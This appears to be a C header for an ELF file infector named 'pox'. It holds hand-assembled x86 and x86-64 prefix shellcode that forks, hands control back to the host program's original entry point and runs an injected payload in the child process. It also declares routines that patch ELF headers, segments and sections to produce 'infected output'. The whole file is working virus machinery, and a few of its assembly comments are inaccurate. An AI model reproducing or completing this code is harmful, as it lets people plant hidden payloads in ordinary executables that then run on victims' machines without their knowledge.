#ifndef _POX_H
#define _POX_H

#include <elf.h>
#include <stdbool.h>
#include <stddef.h>
#ifdef DEBUG
#include <stdio.h>
#endif

#define PAGESIZE 0x1000
#define E32(pbin) ((Elf32_Ehdr*)pbin->base)
#define E64(pbin) ((Elf64_Ehdr*)pbin->base)

#define S32(pbin) ((Elf32_Shdr*)(pbin->base + E32(pbin)->e_shoff))
#define S64(pbin) ((Elf64_Shdr*)(pbin->base + E64(pbin)->e_shoff))

#define P32(pbin) ((Elf32_Phdr*)(pbin->base + E32(pbin)->e_phoff))
#define P64(pbin) ((Elf64_Phdr*)(pbin->base + E64(pbin)->e_phoff))


#ifdef DEBUG
#define DBG(fmt, ...) \
        do { if (DEBUG) fprintf(stderr, "[POX] %s:%d:%s(): " fmt, __FILE__, \
                                __LINE__, __func__, __VA_ARGS__); } while (0)
#else
#define DBG(...)
#endif

typedef unsigned char byte_t;

typedef enum {
    ARCH_32,    // x86
    ARCH_64,    // x86-64
    ARCH_UK,    // unknown
} arch_t;

typedef struct {
    unsigned char *base;
    size_t len;
    arch_t arch;
} bin_t;

/*
 * Prefixes are used before any arbitrary payload to allow the parent 
 * process to continue its normal flow of execution while a child process
 */

static const unsigned char pfx32[] = {
    /* store registers so EAX can be used */
    0x60,               // pusha
    0x31, 0xC0,         // xor eax, eax

    /* call fork() system call */
    0xB0, 0x02,         // mov al, 0x02
    0xCD, 0x80,         // int 0x80

    /* test eax, if value is zero (child process) jump to end of prefix */
    0x85, 0xC0,         // test eax, eax
    0x74, 0x12,         // jz <right after prefix>

    /* parent process, restore registers even though EBX will still be destroyed */
    0x61,               // popa

    /* get_eip is a simple routine which stores the current EIP in EBX */
    0xE8,               // call `get_eip`
    0x08, 0x00, 0x00, 0x00,

    /* offset from EIP to the original entry point */
    0x81, 0xEB,         // sub ebx, 0x11223344
    0x44, 0x33, 0x22, 0x11,
    0xFF, 0xE3,         // jmp ebx
    //get_eip, "call" pushes the EIP onto the stack, therefore it exists at *ESP:
    0x8B, 0x1C, 0x24,   // mov ebx, [esp]
    0xC3,               // ret
};
static const size_t pfx32len = sizeof(pfx32);       // length of prefix
static const size_t pfx32jmp = sizeof(pfx32) - 10;  // offset to 0x11223344 which should be overwritten
static const size_t pfx32off = sizeof(pfx32) - 12;  // offset to where the relative EIP is calculated

static const unsigned char pfx64[] = {
    /* Save clobbered registers */
    0x50,               // push rax
    0x51,               // push rcx
    0x52,               // push rdx
    0x56,               // push rsi
    0x57,               // push rdi
    0x41, 0x53,         // push 11

    /* call fork() and check if result is == 0 (child) */
    0x48, 0x31, 0xC0,   // xor rax, rax
    0xB0, 0x39,         // mov al, 0x39
    0x0F, 0x05,         // syscall
    0x48, 0x85, 0xC0,   // test rax, rax
    0x74, 0x18,         // jz <right after prefix>

    /* replace clobbered registers */
    0x41, 0x5B,         // pop r11
    0x5F,               // pop rdi
    0x5E,               // pop rsi
    0x5A,               // pop rdx
    0x59,               // pop rcx
    0x58,               // pop rdx

    /* get current RIP... easier than x86 */
    0x4C, 0x8D, 0x05,   // lea r8, [rip]
    0x00, 0x00, 0x00, 0x00,

    /* */
    0x49, 0x81, 0xE8,   // sub r8, 0xFFFFFFFF (replace with offset between vaddr and entry point)
    0xFF, 0xFF, 0xFF, 0xFF,
    0x41, 0xFF, 0xE0,   // jmp r8
};
static const size_t pfx64len = sizeof(pfx64);       // length of prefix
static const size_t pfx64jmp = sizeof(pfx64) - 7;   // offset to 0x11223344 which should be overwritten
static const size_t pfx64off = sizeof(pfx64) - 10;  // offset to where the relative EIP is calculated

/* Simple union to break down a magic header into its constituents */
union magic_t {
    uint32_t val;
    struct { char m0, m1, m2, m3; };
};

bool pox(const bin_t *elf,              // ELF file with length and architecture
         const bin_t *payload,          // Machine code payload with length and target architecture
         bin_t *out,                    // Bin object for the final infected output
         byte_t *buf_tmp,               // Pre-allocated buffer of at least `elf->len` byetes
         byte_t *buf_out);              // Pre-allocated buffer of at least `elf->len + padlen` bytes

void pox_memcpy(void *dst, const void *src, size_t n);
size_t pox_padlen(const bin_t *elf, size_t payload_size);
const byte_t* pox_pfx(const bin_t *bin);
size_t pox_pfxlen(const bin_t *bin);
size_t pox_pfxjmp(const bin_t *bin);
size_t pox_pfxoff(const bin_t *bin);
size_t pox_get_phnum(const bin_t *elf);
size_t pox_get_shnum(const bin_t *elf);
uint64_t pox_get_entry(const bin_t *elf);
const char* pox_get_strtable(const bin_t *elf);
bool pox_is_text_program(const bin_t *elf, size_t idx);
bool pox_is_text_section(const bin_t *elf, size_t idx);
uint64_t pox_get_p_end(const bin_t *elf, size_t idx);
uint64_t pox_get_p_vaddr(const bin_t *elf, size_t idx);
size_t pox_get_p_filesz(const bin_t *elf, size_t idx);
size_t pox_get_s_offset(const bin_t *elf, size_t idx);
size_t pox_get_s_name(const bin_t *elf, size_t idx);
bool pox_set_entry(bin_t *elf, uint64_t entry);
bool pox_extend_shoff(bin_t *elf, size_t offset);
bool pox_extend_p_offset(bin_t *elf, size_t idx, size_t offset);
bool pox_extend_p_filesz(bin_t *elf, size_t idx, size_t offset);
bool pox_extend_p_memsz(bin_t *elf, size_t idx, size_t offset);
bool pox_extend_s_offset(bin_t *elf, size_t idx, size_t offset);
bool pox_extend_s_size(bin_t *elf, size_t idx, size_t offset);

#endif//_POX_H
